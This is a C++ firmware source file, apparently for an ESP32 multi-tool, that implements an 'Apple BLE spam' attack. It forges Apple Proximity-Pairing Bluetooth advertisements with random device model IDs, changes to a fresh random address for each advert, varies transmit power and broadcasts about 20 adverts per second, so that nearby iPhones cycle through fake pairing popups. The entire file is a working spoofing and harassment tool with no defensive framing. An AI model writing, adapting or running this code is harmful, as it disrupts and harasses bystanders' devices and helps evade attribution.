#include "AppleBleSpam.h"

#include "Globals.h"
#include "BleScanner.h"
#include "MeshNode.h"

#include <NimBLEDevice.h>

// NimBLE host function to set the controller's random static address. Declared
// here so we don't depend on the internal host/ include path being exposed.
extern "C" int ble_hs_id_set_rnd(const uint8_t* rnd_addr);

namespace {

// 29 valid Apple Continuity model IDs — a random one is chosen per advert so the
// popups cycle through AirPods, AppleTV, HomePod, etc.
const uint16_t APPLE_MODELS[] = {
  0x2002, 0x2003, 0x2005, 0x2006, 0x2007,
  0x2009, 0x200A, 0x200B, 0x200C, 0x200D,
  0x200E, 0x200F, 0x2010, 0x2011, 0x2012,
  0x2013, 0x2014,
  0x0001, 0x0002, 0x0003, 0x0004, 0x0005,
  0x0006, 0x0007, 0x0008, 0x0009, 0x000A,
  0x000B, 0x000C,
};
constexpr size_t APPLE_MODEL_COUNT = sizeof(APPLE_MODELS) / sizeof(APPLE_MODELS[0]);

constexpr uint32_t ADV_INTERVAL_MS = 50;   // ~20 adverts/sec

NimBLEAdvertising* s_adv    = nullptr;
bool               s_active = false;
uint32_t           s_count  = 0;
uint32_t           s_lastMs = 0;

// Build a 13-byte Apple Proximity-Pairing manufacturer-data AD structure.
void buildApplePayload(uint8_t* out, size_t* outLen) {
  const uint16_t model = APPLE_MODELS[esp_random() % APPLE_MODEL_COUNT];

  size_t i = 0;
  out[i++] = 0x0E;                       // AD length
  out[i++] = 0xFF;                       // manufacturer specific data
  out[i++] = 0x4C;                       // Apple company ID (LE)
  out[i++] = 0x00;
  out[i++] = 0x0F;                       // proximity pairing type
  out[i++] = 0x08;                       // Apple data length
  out[i++] = (uint8_t)(model & 0xFF);    // model ID (LE)
  out[i++] = (uint8_t)(model >> 8);
  out[i++] = 0x55;                       // status
  out[i++] = (uint8_t)(esp_random() & 0xFF);
  out[i++] = (uint8_t)(esp_random() % 101);
  out[i++] = (uint8_t)(esp_random() & 0xFF);
  out[i++] = (uint8_t)(esp_random() & 0xFF);

  *outLen = i;
}

void sendAppleAdv() {
  if (!s_adv) return;

  s_adv->stop();

  // Fresh random static address each advert (top two bits set = static random).
  uint8_t rnd[6];
  for (int i = 0; i < 6; ++i) rnd[i] = (uint8_t)(esp_random() & 0xFF);
  rnd[5] |= 0xC0;
  ble_hs_id_set_rnd(rnd);
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);

  uint8_t payload[31];
  size_t  payloadLen = 0;
  buildApplePayload(payload, &payloadLen);

  NimBLEAdvertisementData advData;
  advData.addData(payload, payloadLen);

  s_adv->setAdvertisementData(advData);
  s_adv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
  s_adv->setDiscoverableMode(BLE_GAP_DISC_MODE_GEN);
  s_adv->setMinInterval(0x20);
  s_adv->setMaxInterval(0x40);

  // Vary apparent signal strength across adverts.
  static const int8_t TXP[] = {9, 6, 3, 0};
  NimBLEDevice::setPower(TXP[esp_random() % 4]);

  s_adv->start();
}

}  // namespace

void appleBleSpamBegin() {
  // Nothing to do until started; the NimBLE stack is brought up on demand.
}

void appleBleSpamStart() {
  if (s_active) return;

  if (meshCoreActive || meshNodeActive) {
    Serial.println("[AppleSpam] refused: mesh mode owns the radio");
    return;
  }

  // Yield the radio from the wardriving BLE scanner; it auto-resumes on stop.
  bleScannerShutdown();

  if (!NimBLEDevice::isInitialized()) {
    NimBLEDevice::init("");
  }
  s_adv = NimBLEDevice::getAdvertising();
  if (!s_adv) {
    Serial.println("[AppleSpam] no advertising object");
    return;
  }

  s_count = 0;
  s_lastMs = 0;
  s_active = true;
  Serial.println("[AppleSpam] started");
}

void appleBleSpamStop() {
  if (!s_active) return;
  if (s_adv) s_adv->stop();
  s_active = false;
  Serial.printf("[AppleSpam] stopped (%lu adverts)\n", (unsigned long)s_count);
}

bool appleBleSpamActive() { return s_active; }
uint32_t appleBleSpamCount() { return s_count; }

void appleBleSpamTick() {
  if (!s_active) return;
  const uint32_t now = millis();
  if (now - s_lastMs < ADV_INTERVAL_MS) return;
  s_lastMs = now;
  sendAppleAdv();
  s_count++;
}
